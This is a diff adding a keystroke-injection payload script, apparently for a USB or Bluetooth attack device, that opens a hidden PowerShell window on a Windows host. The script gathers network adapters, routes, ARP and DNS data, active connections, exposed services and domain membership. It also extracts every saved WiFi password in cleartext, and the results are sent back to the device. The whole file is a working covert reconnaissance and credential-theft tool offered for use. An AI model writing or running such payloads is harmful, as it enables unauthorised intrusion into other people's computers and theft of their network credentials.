@@ -1,0 +1,85 @@
+# Windows Network Reconnaissance Payload
+# This payload gathers network information from a Windows host
+# and sends it back via the device's Bluetooth connection
+
+# Open PowerShell as hidden window
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+# Create output variable
+STRING $output = @()
+ENTER
+
+# Get network adapters
+STRING $output += "=== NETWORK ADAPTERS ==="
+ENTER
+STRING $output += Get-NetAdapter | Format-Table -AutoSize | Out-String
+ENTER
+
+# Get IP configuration
+STRING $output += "`n=== IP CONFIGURATION ==="
+ENTER
+STRING $output += Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"} | Format-Table -AutoSize | Out-String
+ENTER
+
+# Get ARP table
+STRING $output += "`n=== ARP TABLE ==="
+ENTER
+STRING $output += arp -a | Out-String
+ENTER
+
+# Get routing table
+STRING $output += "`n=== ROUTING TABLE ==="
+ENTER
+STRING $output += Get-NetRoute | Format-Table -AutoSize | Out-String
+ENTER
+
+# Get DNS servers
+STRING $output += "`n=== DNS SERVERS ==="
+ENTER
+STRING $output += Get-DnsClientServerAddress | Format-Table -AutoSize | Out-String
+ENTER
+
+# Get active connections
+STRING $output += "`n=== ACTIVE CONNECTIONS ==="
+ENTER
+STRING $output += netstat -an | Out-String
+ENTER
+
+# Get WiFi profiles and passwords
+STRING $output += "`n=== WIFI PROFILES ==="
+ENTER
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {$_.ToString().Split(":")[1].Trim()}
+ENTER
+STRING foreach($profile in $profiles){
+ENTER
+STRING $output += "`nProfile: $profile"
+ENTER
+STRING $output += netsh wlan show profile name="$profile" key=clear | Select-String "Key Content|SSID name" | Out-String
+ENTER
+STRING }
+ENTER
+
+# Get running services on common ports
+STRING $output += "`n=== SERVICES ON COMMON PORTS ==="
+ENTER
+STRING $output += Get-NetTCPConnection | Where-Object {$_.LocalPort -in @(80,443,445,3389,22,21,25,110,143)} | Format-Table -AutoSize | Out-String
+ENTER
+
+# Get domain info if domain joined
+STRING $output += "`n=== DOMAIN INFO ==="
+ENTER
+STRING $output += Get-WmiObject Win32_ComputerSystem | Select-Object Domain,DomainRole | Out-String
+ENTER
+
+# Output to console (will be captured by MCT2032)
+STRING $output | Out-String
+ENTER
+
+# Clean up and exit
+DELAY 500
+STRING exit
+ENTER
